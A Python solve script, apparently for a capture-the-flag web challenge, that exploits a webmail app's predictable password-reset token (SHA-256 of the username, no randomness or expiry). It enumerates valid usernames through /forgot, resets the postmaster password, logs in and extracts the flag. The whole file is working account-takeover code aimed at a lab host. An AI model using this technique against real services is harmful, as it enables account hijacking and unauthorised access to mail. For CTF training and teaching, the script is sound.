#!/usr/bin/env python3
"""
InboxNow Webmail (auth, 150) — CWE-640/330, name-derived password-reset token.

The reset token is deterministic and name-only: sha256("reset:"+username)[:20],
with no randomness, no clock and no expiry. /forgot also leaks which usernames
exist (it only reveals a link for valid accounts). Target the privileged
`postmaster` mailbox: compute its token, reset the password, log in, read the flag.

Usage:
    python3 solve.py                          # defaults to auth11.chal.deti:8070
    python3 solve.py http://auth11.chal.deti:8070
"""
import hashlib
import re
import sys

import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://auth11.chal.deti:8070"
TARGET = "postmaster"
NEWPASS = "Pwned123!"

FLAG_RE = re.compile(r"flag\{[^}]*\}")


def reset_token(username: str) -> str:
    return hashlib.sha256(f"reset:{username}".encode()).hexdigest()[:20]


def enumerate_users(candidates) -> list:
    """Optional: /forgot reveals a /reset/ link only for valid usernames."""
    valid = []
    for u in candidates:
        r = requests.post(f"{BASE}/forgot", data={"username": u}, timeout=10)
        if re.search(r"/reset/[0-9a-f]+", r.text):
            valid.append(u)
    return valid


def main() -> int:
    token = reset_token(TARGET)
    print(f"[i] {TARGET} reset token: {token}")

    s = requests.Session()
    s.post(f"{BASE}/forgot", data={"username": TARGET}, timeout=10)          # activate
    s.post(f"{BASE}/reset/{token}", data={"password": NEWPASS}, timeout=10)  # take over
    s.post(f"{BASE}/login", data={"username": TARGET, "password": NEWPASS}, timeout=10)

    r = s.get(f"{BASE}/", timeout=10)
    m = FLAG_RE.search(r.text)
    if m:
        print(f"[+] FLAG: {m.group(0)}")
        return 0
    print(f"[!] logged in but no flag on landing (status {r.status_code})")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
